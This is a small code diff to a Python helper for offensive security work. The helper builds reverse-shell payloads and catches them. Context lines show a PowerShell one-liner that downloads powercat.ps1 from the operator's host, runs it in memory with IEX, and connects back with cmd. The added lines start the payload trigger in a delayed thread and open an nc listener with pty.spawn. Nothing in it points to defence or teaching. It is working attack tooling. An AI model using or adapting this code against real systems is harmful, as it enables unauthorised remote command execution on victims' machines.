@@ -4,6 +4,8 @@ import socket
 import sys
 import pty
 import util
+import time
+import threading
 
 def generatePayload(type, local_address, port):
 
@@ -29,7 +31,11 @@ def generatePayload(type, local_address, port):
         return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
 
 def triggerShell(func, port):
-    func()
+    def _wait_and_exec():
+        time.sleep(1.5)
+        func()
+
+    threading.Thread(target=_wait_and_exec).start()
     pty.spawn(["nc", "-lvvp", str(port)])
 
 
